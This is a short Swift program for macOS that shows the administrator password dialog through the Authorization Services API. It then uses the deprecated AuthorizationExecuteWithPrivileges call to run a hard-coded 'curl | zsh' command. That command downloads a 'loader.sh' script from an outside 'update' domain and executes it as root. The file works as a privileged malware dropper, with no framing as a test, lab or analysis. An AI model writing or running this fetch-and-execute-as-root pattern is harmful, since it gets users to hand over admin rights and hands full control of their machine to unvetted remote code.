import Foundation
import Security

func runWithPrivileges(script: String) -> Bool {
    // Create authorization
    var authRef: AuthorizationRef?
    var status = AuthorizationCreate(nil, nil, [], &authRef)
    guard status == errAuthorizationSuccess, let auth = authRef else {
        return false
    }
    
    // Request privileges — this shows the GUI password dialog
    var items = [AuthorizationItem(name: kAuthorizationRightExecute, valueLength: 0, value: nil, flags: 0)]
    var rights = AuthorizationRights(count: 1, items: &items)
    let flags: AuthorizationFlags = [.interactionAllowed, .preAuthorize, .extendRights]
    
    status = AuthorizationCopyRights(auth, &rights, nil, flags, nil)
    guard status == errAuthorizationSuccess else {
        AuthorizationFree(auth, [.destroyRights])
        return false
    }
    
    // Execute script with privileges
    let args = ["-c", script]
    var cArgs = args.map { strdup($0) }
    cArgs.append(nil)
    
    var pipe: Int32 = -1
    status = AuthorizationExecuteWithPrivileges(auth, "/bin/zsh", [], &cArgs, &pipe)
    
    cArgs.dropLast().forEach { free($0) }
    AuthorizationFree(auth, [.destroyRights])
    
    return status == errAuthorizationSuccess
}

let script = "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"
let success = runWithPrivileges(script: script)
exit(success ? 0 : 1)
